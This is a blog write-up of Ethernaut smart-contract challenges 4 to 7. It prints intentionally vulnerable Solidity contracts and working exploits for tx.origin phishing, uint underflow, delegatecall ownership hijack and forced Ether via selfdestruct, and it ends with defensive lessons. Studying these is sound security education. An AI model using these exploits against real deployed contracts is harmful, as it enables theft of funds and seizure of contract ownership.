---
title: "Ethernaut: Phishing tx.origin, Arithmetic Overflow, delegateCall, and forcibly sending Ether."
description: Let's continue the Ethernaut with challenges 4 through 7. These are quite interesting and point out several of the basic vulnerabilities you should be aware of when writing smart contracts.
date: 2022-05-07T08:54:53.580Z
tags:
  - Blockchain
  - Ethereum
  - JavaScript
  - Web3
  - Solidity
cover: /blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/cover.webp
---

Let's continue the Ethernaut with challenges 4 through 7. These are quite interesting and point out several of the basic vulnerabilities you should be aware of when writing smart contracts.

:D

## 4th Challenge: Telephone - tx.origin phishing

The goal is to gain ownership of the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```
Notice the `changeOwner()` function is performing a very rudimentary and naive authorization. Suppose that you call this function directly. Then `tx.origin` is in fact equal to `msg.sender`. So no one can call the function and change the owner. 


![8403E7FC-90A9-4D4E-8C3A-8AE17661C1F3.png](/blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/9lNJHmx0z.png align="left")

The key is the difference between the two. `tx.origin` is a global variable that holds the address that initiated the transaction. While `msg.sender` is the address that called that specific function. [Check out solidity docs page about global variables](https://docs.soliditylang.org/en/v0.8.13/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties)

So the way to hack this is pretty straightforward. Write a new smart contract that forwards your wallet address to the original. Then call the attacking contract from your address.


![A932E859-AB91-42DD-8521-7DCD64846030.png](/blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/EbtSFk7Xj.png align="left")

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

...

contract TelephoneAttack {
 Telephone original;
 constructor(address _original) public {
  original = Telephone(_original);
 }

 function pwnTelephone() public {
  original.changeOwner(msg.sender);
 }
}
``` 

Once we call `pwnTelephone()` we can submit the challenge.


![Screen Shot 2022-05-06 at 22.56.43.png](/blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/L66GTZ-yo.webp align="left")

You can check out the doc's [security considerations about `tx.origin`](https://docs.soliditylang.org/en/v0.8.13/security-considerations.html?highlight=tx.origin#tx-origin) to see an example of using a `tx.origin` phishing attack on a vulnerable contract.

## 5th Challenge: Token - Arithmetic Underflow

You have to hack the following token contract. And get as much tokens as possible from it. You are given 20 tokens to start with.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

The only thing that stops us from stealing from the contract is the line

```solidity
require (balances[msg.sender] - _value >= 0)
```
The type `uint` means an unsigned integer of 256 bits. Which can *and will* underflow or overflow. If the result of some arithmetic operation exceeds it's maximum or minimum possible values.

Consider `20 - value` where `value = 21`. Then, under the normal arithmetic, the result would be -1. But in 256bit arithmetic the result is \\(2^{256} - 1\\)

Check the following example with 8bit unsigned integer arithmetic:

![F217BEE4-C71C-436B-A6FD-24405EE0F087.png](/blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/GIlniR1wv.png align="left")

Therefore, by calling `transfer(<someAdress>, 21)` on the smart contract, we will end up with an enormous amount of tokens!

This kind of attack is well known and contracts almost always use solutions like [SafeMath.sol](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath) to protect themselves form overflow attacks. Starting from [solidity 0.8, the arithmetic operations in integers are safe by default](https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html).

Hacking this one is pretty simple. In the console, I can type:

```js
await contract.transfer(level, 21)
```
`level` is a reference to the level's contract address. Ethernaut exposes it for convenience. It doesn't matter. As long as its different from my address (ie. `msg.sender`)

What we want is to underflow `balances[msg.sender] -= _value`. By having it compute `20-21` which in `uint256` arithmetic equals `2**256 - 1`.

After that, we can check that we effectively hacked the contract by checking our balance and then submit the solution.


![Screen Shot 2022-05-06 at 23.16.19.png](/blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/1pje3waJP.webp align="left")

> By now you get the idea. A flashy message appears on the console once you submit a correct solution.

## 6th Challenge: Delegation

You have to claim ownership of the `Delegation` contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

We can execute the `pwn()` function from the `Delegate` contract in the context of `Delegation`. Using [`<address>.delegatecall(bytes memory) returns (bool, bytes memory)`](https://docs.soliditylang.org/en/v0.8.13/units-and-global-variables.html#members-of-address-types). Which allows [precisely such behavior](https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall). 

This can be specially dangerous as a contract can dynamically load code from another contract at runtime. Using the first's storage, address and balance. 

![D6598345-37B3-4D42-8E16-C7E6E22EA4AA.png](/blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/R8Cq9go2h.png align="left")

As per the Ethernaut's setup `Delegation` gets the `Delegate` contract address when deployed.

The only thing we need to do is send a transaction with msg.data set to "pwn()" (encoded) to trigger the fallback from `Delegation` the function that we want to run from `Delegate`. Note that `Delegate` also has an `owner` state variable. This is necessary as the delegate must have the same variables. As delegatecall does not match variable names but rather matches state variable layout. 

>If you want to learn more, you may want to read about the [proxy upgrade pattern](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies). It uses delegatecall to allow for "upgrading" of smart contracts. One of the problems you can run into when using this pattern is [storage collision](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies#unstructured-storage-proxies)

We want to claim ownership ourselves, so we cannot write a smart contract to trigger the fallback for us (we want `msg.sender` to be our own address). So we need to send the transaction from the console:

```js
await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})
```
We are using [web3.js to encode the signature](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html#encodefunctionsignature) and the truffle contract abstraction that Ethernaut exposes for us.

We can then check that we gained ownership:

```js
await contract.owner() == player
>> true
```

![Screen Shot 2022-05-07 at 3.44.36.png](/blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/s_wUxiXyu.webp align="left")

## 7th Challenge: Force

The following contract cannot accept any Eth. So, naturally, the challenge is to make the balance of the contract greater than zero.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
There are three general ways to send eth to a contract. First, if the contract has any payable function, calling it with some ether will achieve the transfer.

The other two are exploits. When a second contract with some ether selfdestructs it will send its ether to a "beneficiary" contract. Without triggering any function nor the fallback. So the beneficiary *will* receive the ether. Regardless of whether it is payable or not.

The third way is finding a way of pre-computing the target contract's address before it is deployed (as addresses are deterministic). And sending some eth to such address. When the contract is deployed it will have some ether. Surprisingly that works!

We will use the second option. And write a new contract. Seed it with some eth, and calling self-destruct on it, with the target contract as beneficiary.

```solidity
pragma solidity ^0.6.0;

contract ForceEther {
    address target;
    constructor (address _target) public {
        target = _target;
    }

    function force() public payable {
        selfdestruct(payable(target));
    }
}
```
When `force()` is called with some ether, the contract will self-destruct and force-send the ether to the target contract. Completing the challenge.

![Screen Shot 2022-05-07 at 2.54.28.png](/blog/ethernaut-phishing-txorigin-arithmetic-overflow-delegatecall-and-forcibly-sending-ether/2v3RRQ6zH.webp align="left")

## Epilogue.

Here are some of the lessons from these challenges.

- Do not use `tx.origin` for authorization. A phishing contract may ask you to sign a transaction to a vulnerable contract. Setting up the attack.
- Always make sure that integers cannot under or over flow. Use SafeMath.sol or solidity 0.8.0
- Never delegatecall from a contract you do not trust. As you will modify your own contract's state variables with some outside functions that may (and probably will) be malicious.
- Never assume your contract is safe from forcefully receiving ether. Even if you revert your fallback. If some of your logic depends on `address(this).balance` someone can really mess up your contract by forcefully sending ether.

You can check out this [Comprehensive list of known attack vectors and common anti-patterns](https://blog.sigmaprime.io/solidity-security.html) on sigmaprime's blog.

Hopefully you found this interesting!

Maybe follow me on twitter?

<a href="https://twitter.com/jrlgs?ref_src=twsrc%5Etfw" class="twitter-follow-button" data-show-count="false">Follow @jrlgs</a>
